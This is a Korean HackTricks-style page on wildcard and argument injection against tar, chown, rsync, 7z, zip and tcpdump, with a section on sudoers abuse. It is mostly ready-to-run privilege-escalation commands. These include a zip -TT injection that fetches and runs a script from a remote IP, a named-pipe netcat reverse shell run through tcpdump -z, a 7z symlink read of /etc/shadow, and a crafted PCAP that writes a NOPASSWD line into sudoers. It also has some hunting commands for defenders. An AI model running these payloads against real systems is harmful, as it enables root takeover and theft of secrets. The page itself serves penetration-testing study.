# 와일드카드 추가 트릭

{{#include ../../banners/hacktricks-training.md}}

> Wildcard(또는 *glob*) **argument injection**은 권한 있는 script가 `tar`, `chown`, `rsync`, `zip`, `7z`, …와 같은 Unix binary를 `*`처럼 따옴표로 감싸지 않은 wildcard와 함께 실행할 때 발생합니다.
> shell은 binary를 실행하기 **전에** wildcard를 확장하므로, 작업 디렉터리에 파일을 생성할 수 있는 attacker는 `-`로 시작하는 filename을 만들어 해당 filename이 **data가 아닌 option으로** 해석되도록 할 수 있습니다. 이를 통해 임의의 flag 또는 command까지 효과적으로 주입할 수 있습니다.
> 이 페이지에서는 2023-2025년에 가장 유용한 primitive, 최신 research 및 modern detection을 정리합니다.

## chown / chmod

`--reference` flag를 악용하면 **임의의 file의 owner/group 또는 permission bit를 복사**할 수 있습니다:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
나중에 root가 다음과 같은 명령을 실행하면:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file`이 주입되어, 일치하는 *모든* 파일이 `/root/secret``file`의 소유권/권한을 상속하게 됩니다.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
자세한 내용은 classic DefenseCode paper도 참고하세요.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 기능을 악용하여 임의의 명령을 실행합니다:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Once root가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 root 권한으로 실행됩니다.

### bsdtar / macOS 14+

최근 macOS의 기본 `tar`(`libarchive` 기반)는 *`--checkpoint`를 구현하지 않지만*, 외부 compressor를 지정할 수 있는 **`--use-compress-program`** flag를 사용하면 여전히 code-execution을 달성할 수 있습니다.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
권한이 있는 script에서 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.

---

## rsync

`rsync`에서는 `-e` 또는 `--rsync-path`로 시작하는 command-line flags를 통해 remote shell 또는 remote binary를 override할 수 있습니다:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root가 나중에 `rsync -az * backup:/srv/`로 디렉터리를 archive하면, 주입된 flag가 remote side에서 shell을 실행합니다.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

privileged script가 option parsing을 중지하기 위해 wildcard 앞에 `--`를 *defensively* 붙이는 경우에도, 7-Zip format은 filename 앞에 `@`를 붙여 **file list files**를 지원합니다. 이를 symlink와 결합하면 *arbitrary files를 exfiltrate*할 수 있습니다:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root가 다음과 같은 작업을 실행하는 경우:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip은 `root.txt` (`→ /etc/shadow`)를 file list로 읽으려고 시도한 뒤 중단되며, **내용을 stderr에 출력합니다**.

이는 `-- *`에서도 동작합니다. 7-Zip CLI가 일반 filenames와 `@listfiles`를 모두 positional inputs로 명시적으로 허용하기 때문에, `@root.txt`와 같은 literal filename도 여전히 특별하게 처리됩니다.

---

## zip

애플리케이션이 user-controlled filenames를 `zip`에 전달할 때(와일드카드를 사용하거나 `--` 없이 이름을 열거하는 경우) 매우 실용적인 두 가지 primitives가 존재합니다.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T`는 “test archive”를 활성화하고, `-TT <cmd>`는 tester를 arbitrary program으로 대체합니다(긴 형식: `--unzip-command <cmd>`). `-`로 시작하는 filenames를 주입할 수 있다면, short-options parsing이 작동하도록 flags를 서로 다른 filenames로 나눕니다:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
참고
- `'-T -TT <cmd>'`처럼 단일 filename을 사용하지 마세요 — short options는 문자별로 파싱되므로 실패합니다. 아래와 같이 별도의 token을 사용하세요.
- 앱에서 filenames의 슬래시가 제거되는 경우, bare host/IP에서 가져오고(기본 경로 `/index.html`) `-O`를 사용해 로컬에 저장한 다음 실행하세요.
- `-sc`(처리된 argv 표시) 또는 `-h2`(추가 도움말)를 사용해 parsing을 debug하면 token이 어떻게 소비되는지 확인할 수 있습니다.

Example (zip 3.0에서의 로컬 동작):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- 데이터 exfil/leak: 웹 레이어가 `zip` stdout/stderr를 그대로 출력하는 경우(naive wrapper에서 흔함), `--help` 같은 injected flags 또는 잘못된 options로 인한 실패가 HTTP response에 노출되어 command-line injection을 확인하고 payload를 조정하는 데 도움이 됩니다.

---

## wildcard injection에 취약한 추가 binaries (2023-2025 quick list)

다음 commands는 최신 CTF와 실제 환경에서 악용되었습니다. payload는 항상 이후 wildcard로 처리될 writable directory 내부에 *filename*으로 생성됩니다:

| Binary | 악용할 Flag | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 임의의 `@file` | 파일 내용 읽기 |
| `flock` | `-c <cmd>` | command 실행 |
| `git`   | `-c core.sshCommand=<cmd>` | SSH를 통한 git 경유 command execution |
| `scp`   | `-S <cmd>` | ssh 대신 임의의 program 실행 |

이러한 primitives는 *tar/rsync/zip* classics보다 덜 일반적이지만, hunting 시 확인할 가치가 있습니다.

---

## 취약한 wrappers 및 jobs hunting

최근 case studies에 따르면 wildcard/argv injection은 더 이상 **cron + tar** 문제에만 국한되지 않습니다.<sup>[[5]](#references)</sup> 동일한 bug class는 다음과 같은 곳에서 계속 발견되고 있습니다:

- attacker-controlled upload directories에서 "download everything as zip/tar"를 제공하는 web features
- attacker-controlled filename/filter fields를 사용하는 **tcpdump** wrapper를 노출하는 vendor/appliance debug shells
- writable directories에서 `tar`, `rsync`, `7z`, `zip`, `chown` 또는 `chmod`를 호출하는 backup 또는 rotation jobs

유용한 triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
간단한 휴리스틱:

- `-- *`는 많은 GNU 도구에서 좋은 해결책이지만, `@listfiles`가 별도로 파싱되는 `7z`/`7za`에는 적용되지 않습니다.
- `zip`의 경우, 사용자가 제어하는 파일 이름을 직접 열거하는 wrappers를 찾으세요. shell glob이 없어도 short-option splitting (`-T` + `-TT <cmd>`)은 여전히 작동합니다.
- `tcpdump`의 경우, **output file names**, **rotation settings** 또는 **capture-file replay** 인자를 제어할 수 있게 하는 wrappers에 특히 주의하세요.

---

## tcpdump rotation hooks (-G/-W/-z): wrappers의 argv injection을 통한 RCE

restricted shell 또는 vendor wrapper가 사용자 제어 필드(예: "file name" parameter)를 strict quoting/validation 없이 연결하여 `tcpdump` command line을 구성하면, 추가 `tcpdump` flags를 몰래 삽입할 수 있습니다. `-G` (time-based rotation), `-W` (limit number of files), `-z <cmd>` (post-rotate command)의 조합을 사용하면 `tcpdump`를 실행하는 사용자 권한(어플라이언스에서는 root인 경우가 많음)으로 임의의 command execution이 가능합니다.<sup>[[1]](#references)[[4]](#references)</sup>

사전 조건:

- `tcpdump`에 전달되는 `argv`에 영향을 줄 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>`와 같은 wrapper를 통해).
- wrapper가 file name field 내의 공백 또는 `-`로 시작하는 token을 sanitize하지 않아야 합니다.

Classic PoC (writable path의 reverse shell script를 실행):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
세부 정보:

- `-G 1 -W 1`은 첫 번째 일치하는 packet 이후 즉시 rotate를 강제합니다.
- `-z <cmd>`는 각 rotate마다 post-rotate command를 한 번 실행합니다. 많은 build에서는 `<cmd> <savefile>`을 실행합니다. `<cmd>`가 script/interpreter인 경우 argument 처리가 payload와 일치하는지 확인해야 합니다.

removable media가 필요 없는 variants:

- 파일을 작성할 다른 primitive가 있다면(예: output redirection을 허용하는 별도의 command wrapper), script를 알려진 path에 저장한 뒤, platform semantics에 따라 `-z /bin/sh /path/script.sh` 또는 `-z /path/script.sh`를 trigger합니다.
- 일부 vendor wrapper는 attacker가 제어할 수 있는 location으로 rotate합니다. rotated path에 영향을 줄 수 있다면(symlink/directory traversal), 외부 media 없이도 완전히 제어하는 content를 실행하도록 `-z`를 유도할 수 있습니다.

---

## sudoers: wildcards/additional args가 포함된 tcpdump → arbitrary write/read 및 root

매우 흔한 sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob과 permissive patterns는 첫 번째 `-w` argument에만 제약을 적용합니다. `tcpdump`는 여러 `-w` options를 허용하며, 마지막 항목이 적용됩니다.
- 이 rule은 다른 options를 제한하지 않으므로 `-Z`, `-r`, `-V` 등을 사용할 수 있습니다.

Primitives
- 두 번째 `-w`로 destination path를 override합니다 (첫 번째 항목은 sudoers만 충족):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 제한된 트리에서 벗어나기 위한 첫 번째 `-w` 내부의 Path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root`으로 출력 소유권 강제 (어디서든 root 소유 파일 생성):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r`을 통해 조작된 PCAP을 재생하여 임의 콘텐츠 쓰기(예: sudoers 줄을 기록):

<details>
<summary>정확한 ASCII payload를 포함하는 PCAP을 생성하고 이를 root 권한으로 기록</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>`을 사용한 임의 파일 읽기/secret leak (savefiles 목록으로 해석). Error diagnostics가 종종 라인을 그대로 출력하여 content를 leak함:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 참고 자료

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 전체 Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection을 통한 잠재적 Shell 탐지](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
